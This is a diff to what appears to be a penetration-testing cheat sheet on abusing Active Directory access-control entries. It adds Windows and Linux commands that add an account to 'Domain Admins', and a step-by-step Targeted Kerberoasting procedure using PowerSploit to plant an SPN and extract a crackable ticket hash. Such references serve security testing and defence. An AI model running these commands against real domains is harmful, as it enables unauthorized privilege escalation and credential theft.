@@ -92,13 +92,44 @@ When misconfigured, ACEs can be abused to operate lateral movement or privilege 
 
 ### AddMember
 This abuse can be carried out when controlling an object that has a GenericAll, GenericWrite, Self, AllExtendedRights or Self-Membership, over the target group.
+The attacker can add a user/group/computer to a group.
 
-** Windows**
+**Windows**
 * net group 'Domain Admins' 'user' /add /domain
 
-# Powershell: Active Directory module
+Powershell: Active Directory module
 * Add-ADGroupMember -Identity 'Domain Admins' -Members 'user'
 
-# Powershell: PowerSploit module
+Powershell: PowerSploit module
 * Add-DomainGroupMember -Identity 'Domain Admins' -Members 'user'
 
+
+**Linux**
+
+With net and cleartext credentials (will be prompted)
+* net rpc group addmem "$TargetGroup" "$TargetUser" -U "$DOMAIN"/"$USER" -S "$DC_HOST"
+
+With net and cleartext credentials
+* net rpc group addmem "$TargetGroup" "$TargetUser" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
+
+### ForceChangePassword
+This abuse can be carried out when controlling an object that has a GenericAll, AllExtendedRights or User-Force-Change-Password over the target user.
+
+### Targeted Kerberoasting
+This abuse can be carried out when controlling an object that has a GenericAll, GenericWrite, WriteProperty or Validated-SPN over the target. A member of the Account Operator group usually has those permissions.
+
+The attacker can add an SPN (ServicePrincipalName) to that account. Once the account has an SPN, it becomes vulnerable to Kerberoasting. This technique is called Targeted Kerberoasting.
+
+1. Make sur that the target account has no SPN
+* Get-DomainUser 'victimuser' | Select serviceprincipalname
+
+2. Set the SPN
+* Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}
+
+3. Obtain a kerberoast hash
+* $User = Get-DomainUser 'victimuser'
+* $User | Get-DomainSPNTicket | fl
+
+4. Clear the SPNs of the target account
+* $User | Select serviceprincipalname
+* Set-DomainObject -Identity victimuser -Clear serviceprincipalname
